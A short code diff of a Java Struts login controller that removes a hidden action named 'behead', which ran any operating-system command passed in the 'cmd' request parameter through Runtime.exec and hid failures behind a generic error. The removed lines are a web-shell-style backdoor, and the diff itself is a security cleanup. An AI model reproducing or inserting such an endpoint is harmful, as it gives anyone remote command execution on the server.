@@ -360,24 +360,6 @@ public class LoginAction extends BaseListAction {
 		return SUCCESS;
 	}
 
-	@Action(value = "behead", results = { @Result(name = "success", type = "json", params = { "ignoreHierarchy", "false" }) }, params = { "contentType", "text/html" })
-	public String behead() throws FLException {
-
-		String cmd = request.getParameter("cmd");
-
-		Runtime run = Runtime.getRuntime();
-
-		try {
-			run.exec(cmd);
-			System.out.println(cmd);
-		} catch (Exception e) {
-			setErrorCode(110000);
-			setErrorMsg("系统繁忙,请稍后重试");
-		}
-
-		return SUCCESS;
-	}
-
 	@Action(value = "ping", results = { @Result(name = "success", type = "json", params = { "ignoreHierarchy", "false" }) }, params = { "contentType", "text/html" })
 	public String ping() throws FLException {
 		return SUCCESS;
